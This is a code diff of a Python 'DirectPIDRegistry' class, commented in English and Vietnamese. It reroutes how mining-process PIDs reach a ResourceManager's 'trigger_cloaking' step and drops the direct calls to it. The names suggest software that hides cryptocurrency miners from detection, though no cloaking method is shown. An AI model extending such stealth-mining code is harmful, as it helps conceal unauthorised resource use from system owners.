@@ -988,16 +988,14 @@ class DirectPIDRegistry:
                         name=process_info.process_name,
                         cmd=rm_metadata.get('cmd', [])
                     )
-                    
-                    # **SOLUTION 2: Direct synchronous call** (gọi đồng bộ trực tiếp)
-                    rm_instance.trigger_cloaking(mining_process, 'direct_registry_sync')
-                    logger.info(f"✅ [SOLUTION-2] Direct trigger_cloaking completed for PID {pid}")
+                    # NOTE: Direct trigger_cloaking removed to avoid bypassing ResourceManager de-duplication
+                    # Use unified handoff via receive_from_registry below
                     
                 except ImportError as ie:
                     logger.warning(f"⚠️ [SOLUTION-2] Cannot import MiningProcess: {ie}")
                     # Fallback to receive_from_registry method
                 except Exception as trigger_error:
-                    logger.error(f"❌ [SOLUTION-2] Direct trigger_cloaking failed: {trigger_error}")
+                    logger.error(f"❌ [SOLUTION-2] Preparatory MiningProcess build failed: {trigger_error}")
             
             # **Original flow with receive_from_registry** (luồng gốc với receive_from_registry)
             if hasattr(rm_instance, 'receive_from_registry'):
@@ -1114,10 +1112,10 @@ class DirectPIDRegistry:
             })
             
             if write_success:
-                logger.info(f"📂 [FILE-FALLBACK] PID {pid} file written, attempting direct trigger_cloaking")
+                logger.info(f"📂 [FILE-FALLBACK] PID {pid} file written, using unified receive_from_registry path")
                 
-                # **CRITICAL FIX: Trigger cloaking directly since ResourceManager has no file scanner**
-                # (Sửa quan trọng: Gọi trigger_cloaking trực tiếp vì ResourceManager không có file scanner)
+                # **CRITICAL FIX: Do not call trigger_cloaking directly**
+                # (Không gọi trực tiếp để không bypass de-dup; dùng receive_from_registry)
                 cloaking_triggered = False
                 
                 # **Try to trigger cloaking if we have ResourceManager instance** 
@@ -1142,13 +1140,7 @@ class DirectPIDRegistry:
                             name=process_info.process_name,
                             cmd=rm_metadata.get('cmd', [])
                         )
-                        
-                        # **Trigger cloaking directly** (kích hoạt cloaking trực tiếp)
-                        if hasattr(self._resource_manager, 'trigger_cloaking'):
-                            logger.info(f"🎯 [FILE-FALLBACK] Triggering cloaking for PID {pid} via fallback")
-                            self._resource_manager.trigger_cloaking(mining_process, 'file_fallback_trigger')
-                            cloaking_triggered = True
-                            logger.info(f"✅ [FILE-FALLBACK] Cloaking triggered successfully for PID {pid}")
+                        # NOTE: Skip direct trigger to preserve RM de-dup; rely on receive_from_registry below
                         
                         # **Also try receive_from_registry as backup** (cũng thử receive_from_registry làm backup)
                         if hasattr(self._resource_manager, 'receive_from_registry'):
